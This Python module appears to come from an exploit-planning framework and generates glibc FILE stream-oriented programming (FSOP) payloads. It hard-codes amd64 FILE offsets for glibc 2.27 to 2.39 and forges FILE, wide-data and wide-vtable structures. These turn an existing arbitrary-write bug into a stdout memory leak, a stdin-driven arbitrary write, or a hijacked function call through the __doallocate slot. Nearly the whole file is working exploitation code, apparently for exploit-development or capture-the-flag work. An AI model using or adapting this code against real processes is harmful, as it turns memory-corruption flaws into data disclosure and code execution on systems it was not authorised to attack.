"""Versioned FILE-layout and stream-capability proofs for glibc targets."""

from __future__ import annotations

from dataclasses import dataclass, field
from types import MappingProxyType
from typing import Any, Mapping

from .actions import Action
from .domain import Capability, EffectContract, Evidence, Scope, TechniqueProof
from .errors import ConstraintError, PlanningError
from .packing import Packed
from .payload import Payload


@dataclass(frozen=True, slots=True)
class FILEField:
    name: str
    offset: int
    size: int = 8


@dataclass(frozen=True, slots=True)
class FILELayout:
    implementation: str
    version: tuple[int, int]
    size: int
    fields: Mapping[str, FILEField]
    vtable_validation: bool
    wide_vtable_validation: bool
    assumptions: tuple[str, ...] = ()
    wide_data_vtable_offset: int | None = None
    wide_vtable_call_offset: int | None = None

    def __post_init__(self) -> None:
        object.__setattr__(self, "fields", MappingProxyType(dict(self.fields)))
        for item in self.fields.values():
            if item.offset < 0 or item.size <= 0 or item.offset + item.size > self.size:
                raise ValueError(f"FILE field {item.name!r} is outside the layout")
        for name, offset in (
            ("wide-data vtable", self.wide_data_vtable_offset),
            ("wide-vtable call", self.wide_vtable_call_offset),
        ):
            if offset is not None and offset < 0:
                raise ValueError(f"{name} offset must be non-negative")

    def field(self, name: str) -> FILEField:
        try:
            return self.fields[name]
        except KeyError as error:
            raise ConstraintError(
                f"{self.implementation} {self.version} FILE has no field {name!r}"
            ) from error


def glibc_file_layout(version: str | tuple[int, int]) -> FILELayout:
    if isinstance(version, str):
        parts = version.split(".", 2)
        if len(parts) < 2:
            raise ValueError("glibc FILE version must be major.minor")
        selected = int(parts[0]), int(parts[1])
    else:
        selected = int(version[0]), int(version[1])
    if selected not in {(2, 27), (2, 31), (2, 35), (2, 39)}:
        raise ValueError(
            "reference FILE layout requires explicit glibc 2.27, 2.31, 2.35, or 2.39"
        )
    offsets = {
        "_flags": FILEField("_flags", 0x00),
        "_IO_read_ptr": FILEField("_IO_read_ptr", 0x08),
        "_IO_read_end": FILEField("_IO_read_end", 0x10),
        "_IO_read_base": FILEField("_IO_read_base", 0x18),
        "_IO_write_base": FILEField("_IO_write_base", 0x20),
        "_IO_write_ptr": FILEField("_IO_write_ptr", 0x28),
        "_IO_write_end": FILEField("_IO_write_end", 0x30),
        "_IO_buf_base": FILEField("_IO_buf_base", 0x38),
        "_IO_buf_end": FILEField("_IO_buf_end", 0x40),
        "_chain": FILEField("_chain", 0x68),
        "_fileno": FILEField("_fileno", 0x70, 4),
        "_lock": FILEField("_lock", 0x88),
        "_wide_data": FILEField("_wide_data", 0xA0),
        "_mode": FILEField("_mode", 0xC0, 4),
        "vtable": FILEField("vtable", 0xD8),
    }
    return FILELayout(
        "glibc",
        selected,
        0xE0,
        offsets,
        vtable_validation=selected >= (2, 24),
        wide_vtable_validation=selected >= (2, 39),
        assumptions=(
            f"glibc {selected[0]}.{selected[1]} amd64 FILE ABI",
            "the declared FILE object and pointer fields are writable",
        ),
        wide_data_vtable_offset=0xE0,
        wide_vtable_call_offset=0x68,
    )


@dataclass(frozen=True, slots=True)
class FileObject:
    layout: FILELayout
    values: Mapping[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        object.__setattr__(self, "values", MappingProxyType(dict(self.values)))
        for name in self.values:
            self.layout.field(name)

    def with_fields(self, **values: Any) -> "FileObject":
        return FileObject(self.layout, {**self.values, **values})

    def payload(self) -> Payload:
        output = Payload(fill=b"\x00")
        output.ensure_size(self.layout.size)
        for name, value in self.values.items():
            item = self.layout.field(name)
            output.place(
                item.offset,
                Packed(
                    value,
                    item.size * 8,
                    "little",
                    signed=False,
                    label=f"FILE.{name}",
                ),
                label=f"FILE.{name}",
                encoded=True,
            )
        return output


@dataclass(frozen=True, slots=True)
class StreamCapability:
    name: str
    operation: str
    target: int | None = None
    size: int = 0
    call_target: int | None = None
    evidence: tuple[Evidence, ...] = ()

    def capability(self) -> Capability:
        return Capability(
            self.name,
            EffectContract(
                reads=frozenset({"process.libc-streams"}),
                writes=frozenset({"process.libc-streams"}),
                scope=Scope.PROCESS,
                evidence=self.evidence,
            ),
            evidence=self.evidence,
        )


@dataclass(frozen=True, slots=True)
class FSOPContext:
    file_address: int
    lock: int
    vtable: int
    wide_data: int | None = None
    wide_vtable: int | None = None
    target: int | None = None
    size: int = 0
    call_target: int | None = None


@dataclass(frozen=True, slots=True)
class FSOPWrite:
    address: int
    role: str
    payload: Payload

    def __post_init__(self) -> None:
        if self.address < 0 or not self.role:
            raise ValueError("FSOP writes require a non-negative address and role")


@dataclass(frozen=True, slots=True)
class FSOPProof:
    proof: TechniqueProof
    file: FileObject
    payload: Payload
    writes: tuple[FSOPWrite, ...]

    def describe(self) -> str:
        return self.proof.describe()


@dataclass(frozen=True, slots=True)
class FSOPAction(Action):
    proof: FSOPProof

    def describe(self) -> str:
        return self.proof.describe()

    def contract(self) -> EffectContract:
        return EffectContract(
            requires=self.proof.proof.prerequisites,
            reads=frozenset({"process.libc-streams"}),
            writes=frozenset({"process.libc-streams", "process.memory"}),
            scope=Scope.PROCESS,
            constraints=(),
            evidence=self.proof.proof.evidence,
        )

    def execute(self, _runtime: Any) -> tuple[FSOPWrite, ...]:
        return self.proof.writes


class FSOPProvider:
    def __init__(self, layout: FILELayout):
        self.layout = layout

    def prove(
        self,
        goal: StreamCapability,
        *,
        arbitrary_write: Capability,
        context: FSOPContext,
    ) -> FSOPProof:
        if not isinstance(arbitrary_write, Capability):
            raise TypeError("FSOP requires an explicit arbitrary-write capability")
        if "process.memory" not in arbitrary_write.contract.writes:
            raise PlanningError(
                "FSOP requires a capability that explicitly writes process.memory"
            )
        if arbitrary_write.contract.scope is not Scope.PROCESS:
            raise PlanningError("FSOP arbitrary-write capability must be process-scoped")
        if context.file_address < 0:
            raise PlanningError("FILE storage address must be non-negative")
        base = {
            "_lock": context.lock,
            "vtable": context.vtable,
        }
        evidence = (
            Evidence(
                "file-layout",
                f"{self.layout.implementation} {self.layout.version}",
                "explicit caller selection",
            ),
        )
        if goal.operation == "leak-range":
            target = goal.target if goal.target is not None else context.target
            size = goal.size or context.size
            if target is None or target < 0 or size <= 0:
                raise PlanningError("stream leak requires target and positive size")
            values = {
                **base,
                "_flags": 0xFBAD1800,
                "_IO_read_ptr": target,
                "_IO_read_end": target,
                "_IO_read_base": target,
                "_IO_write_base": target,
                "_IO_write_ptr": target + size,
                "_IO_write_end": target + size,
                "_IO_buf_base": target,
                "_IO_buf_end": target + size,
                "_fileno": 1,
            }
            strategy = "glibc stdout buffer disclosure"
            assumptions = self.layout.assumptions + (
                "the forged object is consumed as stdout",
                "file descriptor 1 is writable",
            )
        elif goal.operation == "write-range":
            target = goal.target if goal.target is not None else context.target
            size = goal.size or context.size
            if target is None or target < 0 or size <= 0:
                raise PlanningError("stream write requires target and positive size")
            values = {
                **base,
                "_flags": 0,
                "_IO_read_ptr": target,
                "_IO_read_end": target + size,
                "_IO_read_base": target,
                "_IO_buf_base": target,
                "_IO_buf_end": target + size,
                "_fileno": 0,
            }
            strategy = "glibc stdin buffer redirection"
            assumptions = self.layout.assumptions + (
                "the forged object is consumed as stdin",
                "file descriptor 0 is readable",
            )
        elif goal.operation == "controlled-call":
            target = (
                goal.call_target
                if goal.call_target is not None
                else context.call_target
            )
            if target is None or target < 0:
                raise PlanningError(
                    "controlled stream call requires a non-negative call target"
                )
            if context.wide_data is None:
                raise PlanningError("controlled stream call requires wide-data storage")
            if context.wide_vtable is None:
                raise PlanningError("controlled stream call requires fake wide-vtable storage")
            if self.layout.wide_vtable_validation:
                raise PlanningError(
                    "selected layout validates wide vtables; no reference bypass is declared"
                )
            if (
                self.layout.wide_data_vtable_offset is None
                or self.layout.wide_vtable_call_offset is None
            ):
                raise PlanningError(
                    "selected layout does not declare controlled-call dispatch offsets"
                )
            values = {
                **base,
                "_flags": 0,
                "_IO_write_base": 0,
                "_IO_write_ptr": 1,
                "_wide_data": context.wide_data,
                "_mode": 0,
            }
            strategy = "glibc wide-stream call control"
            assumptions = self.layout.assumptions + (
                "the declared validated FILE vtable reaches wide dispatch",
                "the layout-declared wide-data vtable pointer is consumed",
                "the layout-declared wide-vtable call slot is invoked",
            )
        else:
            raise PlanningError(f"unsupported stream goal {goal.operation!r}")
        file = FileObject(self.layout, values)
        file_payload = file.payload()
        writes = [FSOPWrite(context.file_address, "FILE", file_payload)]
        if goal.operation == "controlled-call":
            assert context.wide_data is not None
            assert context.wide_vtable is not None
            assert self.layout.wide_data_vtable_offset is not None
            assert self.layout.wide_vtable_call_offset is not None
            wide_data = Payload(fill=b"\x00")
            wide_data.ensure_size(self.layout.wide_data_vtable_offset + 8)
            wide_data.place(
                self.layout.wide_data_vtable_offset,
                Packed(
                    context.wide_vtable,
                    64,
                    "little",
                    signed=False,
                    label="wide_data._wide_vtable",
                ),
                label="wide_data._wide_vtable",
                encoded=True,
            )
            wide_vtable = Payload(fill=b"\x00")
            wide_vtable.ensure_size(self.layout.wide_vtable_call_offset + 8)
            wide_vtable.place(
                self.layout.wide_vtable_call_offset,
                Packed(
                    target,
                    64,
                    "little",
                    signed=False,
                    label="wide_vtable.__doallocate",
                ),
                label="wide_vtable.__doallocate",
                encoded=True,
            )
            writes.extend(
                (
                    FSOPWrite(context.wide_data, "wide-data", wide_data),
                    FSOPWrite(context.wide_vtable, "wide-vtable", wide_vtable),
                )
            )
        proof = TechniqueProof(
            strategy,
            goal.operation,
            (),
            prerequisites=(arbitrary_write,),
            assumptions=assumptions,
            reliability="conditional",
            cost=5,
            evidence=evidence + goal.evidence,
        )
        return FSOPProof(proof, file, file_payload, tuple(writes))

